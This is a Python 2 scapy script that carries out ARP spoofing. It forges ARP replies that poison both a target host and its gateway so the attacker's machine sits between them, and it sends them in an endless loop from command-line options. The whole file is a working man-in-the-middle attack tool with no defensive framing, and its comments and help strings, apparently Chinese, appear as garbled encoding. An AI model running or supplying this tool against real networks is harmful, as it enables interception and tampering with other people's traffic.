#--*--coding=utf-8--*--

from scapy.all import *
import optparse
import threading

#�����linuxϵͳ������ʱ����unicode������ش���
import sys
reload(sys)
sys.setdefaultencoding('utf-8')


def getMac(tgtIP):
    '''
    ����scapy��getmacbyip��������ȡ����Ŀ��IP��MAC��ַ��
    '''
    try:
        tgtMac = getmacbyip(tgtIP)
        return tgtMac
    except:
        print '[-]����Ŀ��IP�Ƿ���' 

def createArp2Station(srcMac,tgtMac,gatewayIP,tgtIP):
    '''
    ����ARP���ݰ���α��������ƭĿ������
    srcMac:������MAC��ַ���䵱�м���
    tgtMac:Ŀ��������MAC
    gatewayIP:���ص�IP�����������ص�����ָ�򱾻����м��ˣ����γ�ARP����
    tgtIP:Ŀ��������IP
    op=2,��ʾARP��Ӧ
    '''
    pkt = Ether(src=srcMac,dst=tgtMac)/ARP(hwsrc=srcMac,psrc=gatewayIP,hwdst=tgtMac,pdst=tgtIP,op=2)
    return pkt

def createArp2Gateway(srcMac,gatewayMac,tgtIP,gatewayIP):
    '''
    ����ARP���ݰ���α��Ŀ��������ƭ����
    srcMac:������MAC��ַ���䵱�м���
    gatewayMac:���ص�MAC
    tgtIP:Ŀ��������IP�������ط���Ŀ������������ָ�򱾻����м��ˣ����γ�ARP����
    gatewayIP:���ص�IP
    op=2,��ʾARP��Ӧ
    '''
    pkt = Ether(src=srcMac,dst=gatewayMac)/ARP(hwsrc=srcMac,psrc=tgtIP,hwdst=gatewayMac,pdst=gatewayIP,op=2)
    return pkt


def main():
    usage = 'Usage: %prog -t <targetip> -g <gatewayip> -i <interface> -a'
    parser = optparse.OptionParser(usage,version='v1.0')
    parser.add_option('-t',dest='targetIP',type='string',help='ָ��Ŀ������IP')
    parser.add_option('-g',dest='gatewayIP',type='string',help='ָ������IP')
    parser.add_option('-i',dest='interface',type='string',help='ָ��ʹ�õ�����')
    parser.add_option('-a',dest='allarp',action='store_true',help='�Ƿ����ȫ��arp��ƭ')
    
    options,args = parser.parse_args()
    tgtIP = options.targetIP
    gatewayIP = options.gatewayIP
    interface = options.interface
  
    if tgtIP == None or gatewayIP == None or interface == None:
        print parser.print_help()
        exit(0)
    
    srcMac = get_if_hwaddr(interface)
    print '����MAC��ַ�ǣ�',srcMac
    tgtMac = getMac(tgtIP)
    print 'Ŀ������MAC��ַ�ǣ�',tgtMac
    gatewayMac = getMac(gatewayIP)
    print '����MAC��ַ�ǣ�',gatewayMac
    raw_input('�������������')


    pktstation = createArp2Station(srcMac,tgtMac,gatewayIP,tgtIP)
    pktgateway = createArp2Gateway(srcMac,gatewayMac,tgtIP,gatewayIP)

   
    i = 1
    while True:
        t = threading.Thread(target=sendp,args=(pktstation,),kwargs={'iface':interface})
        t.start()
        t.join()
        print str(i) + ' [*]����һ�������ARP��ƭ��'
       
        s = threading.Thread(target=sendp,args=(pktgateway,),kwargs={'iface':interface,})
        s.start()
        s.join()
        print str(i) + ' [*]����һ������ARP��ƭ��'
        i += 1       
        
            

if __name__ == '__main__':
    main()